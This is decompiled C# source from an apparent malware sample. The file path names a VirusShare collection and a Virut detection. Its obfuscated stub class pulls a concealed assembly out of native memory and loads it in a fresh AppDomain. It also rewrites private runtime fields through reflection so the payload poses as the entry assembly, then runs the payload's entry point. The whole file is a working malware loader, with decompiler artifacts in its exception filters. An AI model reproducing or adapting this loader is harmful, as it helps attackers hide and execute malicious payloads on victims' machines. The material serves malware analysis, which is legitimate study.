// Decompiled with JetBrains decompiler
// Type: Ç.È
// Assembly: Stub-ogiginale - Copie, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D5C71B5F-F461-47E0-84D8-7434506C39DF
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Virus.Win32.Virut.ce-44d3c8bdcd4b1189c61f7032afb65d6254690326996a45f1a5fcc1fb828cf814.exe

using \u0081Ç;
using \u0082\u00B6;
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0081Ç
{
  [Serializable]
  internal class \u0081È
  {
    private IntPtr ú;
    private IntPtr ø;
    private int õ;
    private string ô;

    private unsafe Assembly \u0082\u0080()
    {
      byte* numPtr = (byte*) \u0082µ.\u0081\u0083((byte*) this.ú.ToPointer());
      if ((IntPtr) numPtr == IntPtr.Zero)
        return (Assembly) null;
      IntPtr ptr = (IntPtr) (void*) numPtr;
      int length1 = Marshal.ReadInt32(ptr);
      IntPtr source = (IntPtr) (void*) (numPtr + 4);
      byte[] rawAssembly = new byte[length1];
      byte[] destination = rawAssembly;
      int length2 = length1;
      Marshal.Copy(source, destination, 0, length2);
      Assembly assembly = Assembly.Load(rawAssembly);
      Marshal.FreeCoTaskMem(ptr);
      return assembly;
    }

    private unsafe Assembly \u0081\u008C()
    {
      byte* numPtr = (byte*) \u0082µ.Ë((byte*) this.ú.ToPointer());
      if ((IntPtr) numPtr == IntPtr.Zero)
        return (Assembly) null;
      IntPtr ptr = (IntPtr) (void*) numPtr;
      string stringAnsi = Marshal.PtrToStringAnsi(ptr);
      Marshal.FreeCoTaskMem(ptr);
      Assembly assembly = (Assembly) null;
      try
      {
        assembly = Assembly.Load(stringAnsi);
      }
      catch (Exception ex)
      {
      }
      return assembly;
    }

    public static unsafe int \u0081Þ(Assembly _param0, int _param1)
    {
      // ISSUE: untyped stack allocation
      int num1 = (int) __untypedstackalloc(\u0082µ.ï());
      IntPtr hinstance = Marshal.GetHINSTANCE(_param0.GetLoadedModules()[0]);
      int num2 = 0;
      \u0081È è = new \u0081È();
      è.ô = _param0.Location;
      è.ú = hinstance;
      è.õ = _param1;
      IntPtr num3 = (IntPtr) (void*) &num2;
      è.ø = num3;
      AppDomain domain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
      int id = domain.Id;
      domain.AssemblyResolve += new ResolveEventHandler(\u0081È.ý);
      CrossAppDomainDelegate callBackDelegate = new CrossAppDomainDelegate(è.\u00A2);
      domain.DoCallBack(callBackDelegate);
      try
      {
        AppDomain.Unload(domain);
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        uint exceptionCode = (uint) Marshal.GetExceptionCode();
        if (\u0082µ.à((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num4 = 0;
        \u0082µ.æ((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num4 = (uint) \u0082µ.ê((void*) Marshal.GetExceptionPointers());
            if (num4 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_10;
          if (num4 != 0U)
            throw;
        }
        finally
        {
          \u0082µ.\u00B9((void*) num1, (int) num4);
        }
      }
label_10:
      \u0082µ.Ò();
      \u0082µ.ü(id);
      return num2;
    }

    public unsafe void \u00A2()
    {
      FieldInfo fieldInfo = (FieldInfo) null;
      // ISSUE: untyped stack allocation
      int num1 = (int) __untypedstackalloc(\u0082µ.ï());
      Assembly entryAssembly = Assembly.GetEntryAssembly();
      uint exceptionCode;
      if ((object) entryAssembly == null)
      {
        if (this.ô != (string) null)
        {
          try
          {
            Assembly assembly = Assembly.LoadFile(this.ô);
            \u0081ã.\u0081\u00B6 = assembly;
            fieldInfo = (FieldInfo) null;
            AppDomain currentDomain = AppDomain.CurrentDomain;
            AppDomainManager appDomainManager = currentDomain.DomainManager;
            if (appDomainManager == null)
            {
              appDomainManager = new AppDomainManager();
              typeof (AppDomain).GetField("_domainManager", BindingFlags.Instance | BindingFlags.NonPublic)?.SetValue((object) currentDomain, (object) appDomainManager);
            }
            typeof (AppDomainManager).GetField("m_entryAssembly", BindingFlags.Instance | BindingFlags.NonPublic)?.SetValue((object) appDomainManager, (object) assembly);
          }
          catch (Exception ex1) when (
          {
            // ISSUE: unable to correctly present filter
            exceptionCode = (uint) Marshal.GetExceptionCode();
            if (\u0082µ.à((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
            uint num2 = 0;
            \u0082µ.æ((void*) Marshal.GetExceptionPointers(), (void*) num1);
            try
            {
              try
              {
              }
              catch (Exception ex2) when (
              {
                // ISSUE: unable to correctly present filter
                num2 = (uint) \u0082µ.ê((void*) Marshal.GetExceptionPointers());
                if (num2 != 0U)
                {
                  SuccessfulFiltering;
                }
                else
                  throw;
              }
              )
              {
              }
              goto label_18;
              if (num2 != 0U)
                throw;
            }
            finally
            {
              \u0082µ.\u00B9((void*) num1, (int) num2);
            }
          }
        }
      }
      else
        \u0081ã.\u0081\u00B6 = entryAssembly;
label_18:
      Assembly assembly1 = (Assembly) null;
      switch (this.õ & 805306368)
      {
        case 536870912:
          assembly1 = this.\u0081\u008C();
          break;
        case 805306368:
          assembly1 = this.\u0082\u0080();
          break;
      }
      if ((object) assembly1 == null)
        return;
      MethodInfo entryPoint = assembly1.EntryPoint;
      if ((object) entryPoint == null)
        return;
      object[] parameters = new object[0];
      if (entryPoint.GetParameters().Length != 0)
      {
        string[] commandLineArgs = Environment.GetCommandLineArgs();
        string[] destinationArray = new string[commandLineArgs.Length - 1];
        int length = destinationArray.Length;
        if (length != 0)
          Array.Copy((Array) commandLineArgs, 1, (Array) destinationArray, 0, length);
        parameters = new object[1]
        {
          (object) destinationArray
        };
      }
      object obj = entryPoint.Invoke((object) null, parameters);
      if (obj == null)
        return;
      try
      {
        Marshal.WriteInt32(this.ø, Convert.ToInt32(obj));
      }
      catch (Exception ex3) when (
      {
        // ISSUE: unable to correctly present filter
        exceptionCode = (uint) Marshal.GetExceptionCode();
        if (\u0082µ.à((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num3 = 0;
        \u0082µ.æ((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex4) when (
          {
            // ISSUE: unable to correctly present filter
            num3 = (uint) \u0082µ.ê((void*) Marshal.GetExceptionPointers());
            if (num3 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          return;
          if (num3 == 0U)
            return;
          throw;
        }
        finally
        {
          \u0082µ.\u00B9((void*) num1, (int) num3);
        }
      }
    }

    public static Assembly ý(object _param0, ResolveEventArgs _param1) => \u0082µ.\u0081ø(_param1.Name);
  }
}
